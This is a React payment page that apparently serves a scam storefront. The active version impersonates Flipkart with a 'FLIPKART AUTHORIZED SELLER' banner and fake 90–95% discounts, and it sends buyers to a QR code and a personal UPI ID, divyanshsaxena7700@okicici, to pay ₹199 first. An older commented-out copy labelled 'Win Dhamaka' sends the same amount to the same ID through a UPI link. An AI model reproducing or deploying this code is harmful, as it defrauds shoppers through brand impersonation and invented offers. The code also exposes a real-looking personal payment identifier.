// import React from "react";
// import "./PaymentPage.css";
// import { useNavigate } from "react-router-dom";

// const PaymentPage = () => {
//   const navigate = useNavigate();

//   const amount = 199;
//   const upiId = "divyanshsaxena7700@okicici";
//   const name = "Win Dhamaka";

//   const makePayment = () => {
//     const upiURL = `upi://pay?pa=${upiId}&pn=${name}&am=${amount}&cu=INR`;

//     window.location.href = upiURL;

//     // After payment, user returns to browser manually
//     setTimeout(() => {
//       navigate("/payment-success");
//     }, 4000);
//   };

//   return (
//     <div className="payment-page">

//       {/* Header */}
//       <div className="payment-header">
//         <span className="back-arrow" onClick={() => window.history.back()}>←</span>
//         <h2>Payments</h2>
//       </div>

//       {/* Steps */}
//       <div className="steps">
//         <div className="step done"><div className="circle">✓</div><p>Address</p></div>
//         <div className="line"></div>

//         <div className="step done"><div className="circle">✓</div><p>Order Summary</p></div>
//         <div className="line"></div>

//         <div className="step active"><div className="circle active-circle">3</div><p>Payment</p></div>
//       </div>

//       {/* Offer Banner */}
//       <div className="upi-banner">
//         🎉 Get up to <b>80% Discount</b> on UPI Payments 🎉
//       </div>

//       {/* Payment Options */}
//       <div className="payment-method" onClick={makePayment}>
//         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/PhonePe_Logo.png/512px-PhonePe_Logo.png" />
//         <span>PhonePe</span>
//       </div>

//       <div className="payment-method" onClick={makePayment}>
//         <img src="https://play-lh.googleusercontent.com/Xa1JpNggCBvs1BgqsSVtXDmZySUdkGFUTkOcJCIZy9FHn5-PP3L7hIwrKyYUVU8sWZM" />
//         <span>Paytm</span>
//       </div>

//       <div className="payment-method" onClick={makePayment}>
//         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Google_Pay_Logo.svg/512px-Google_Pay_Logo.svg.png" />
//         <span>Google Pay</span>
//       </div>

//       <div className="payment-method" onClick={makePayment}>
//         <img src="https://cdn-icons-png.flaticon.com/512/3059/3059997.png" />
//         <span>Scan Pay</span>
//       </div>

//       {/* Price Details */}
//       <div className="price-box">
//         <p className="price-title">Price Details</p>
//         <div className="row"><span>Price (1 item)</span><span>₹5999</span></div>
//         <div className="row"><span>Discount</span><span className="green">90% off</span></div>
//         <div className="row"><span>Delivery Charges</span><span className="green">FREE Delivery</span></div>
//         <div className="row total"><span>Total Amount</span><span>₹199</span></div>
//       </div>

//       {/* Order Now Button */}
//       <button className="order-btn" onClick={makePayment}>Order Now</button>
//     </div>
//   );
// };

// export default PaymentPage;



import React from "react";
import "./PaymentPage.css";
import { useNavigate } from "react-router-dom";

const PaymentPage = () => {
  const navigate = useNavigate();

  const amount = 199;
  const upiId = "divyanshsaxena7700@okicici";
  const name = "Flipkart";

  const makePayment = () => {
    // const upiURL = `upi://pay?pa=${upiId}&pn=${name}&am=${amount}&cu=INR`;
    // window.location.href = upiURL;
alert("Scan QR Code and make payment first to our SELLER");
    setTimeout(() => {
      navigate("/payment-success");
    }, 1000000);
  };

  return (
    <div className="payment-page">

      {/* Header */}
      <div className="payment-header">
        <span className="back-arrow" onClick={() => window.history.back()}>
          ←
        </span>
        <h2>Payments</h2>
      </div>

      {/* Steps */}
      <div className="steps">
        <div className="step done">
          <div className="circle">✓</div>
          <p>Address</p>
        </div>
        <div className="line" />

        <div className="step done">
          <div className="circle">✓</div>
          <p>Order Summary</p>
        </div>
        <div className="line" />

        <div className="step active">
          <div className="circle active-circle">3</div>
          <p>Payment</p>
        </div>
      </div>

      {/* Offer Banner */}
      {/* <div className="upi-banner">
        🎉 Get up to <b>80% Discount</b> on UPI Payments 🎉
      </div> */}


<div className="trust-banner">
  <div className="trust-content">
    <p className="trust-title">
      <span className="trust-icon">✅</span>You are paying to our
    </p>
    <p className="trust-highlight">FLIPKART AUTHORIZED SELLER</p>
  </div>
</div>



      {/* QR Code Container */}
      <div className="qr-container">
     <img src="/QR.png" alt="Scan QR" className="qr-image" />


        <p className="qr-text">Scan & Pay via any UPI App</p>
      </div>

      {/* Payment Options */}
      <div className="payment-method" onClick={makePayment}>
        <img src="/pe.png" />
        <span>PhonePe</span>
      </div>

      <div className="payment-method" onClick={makePayment}>
        <img src="/paytm.png" />
        <span>Paytm</span>
      </div>

      <div className="payment-method" onClick={makePayment}>
        <img src="/gpay.jpg" />
        <span>Google Pay</span>
      </div>

      {/* QR Option Inside List */}
      <div className="payment-method" onClick={makePayment}>
        <img src="https://cdn-icons-png.flaticon.com/512/3059/3059997.png" />
        <span>Scan QR Code</span>
      </div>

      {/* Price Details */}
      <div className="price-box">
        <p className="price-title">Price Details</p>
        <div className="row">
          <span>Price (1 item)</span>
          <span>₹XX99</span>
        </div>
        <div className="row">
          <span>Discount</span>
          <span className="green">95% off</span>
        </div>
        <div className="row">
          <span>Delivery Charges</span>
          <span className="green">FREE Delivery</span>
        </div>
        <div className="row total">
          <span>Total Amount</span>
          <span>₹199</span>
        </div>
      </div>

      <button className="order-btn" onClick={makePayment}>
        Order Now
      </button>
    </div>
  );
};

export default PaymentPage;
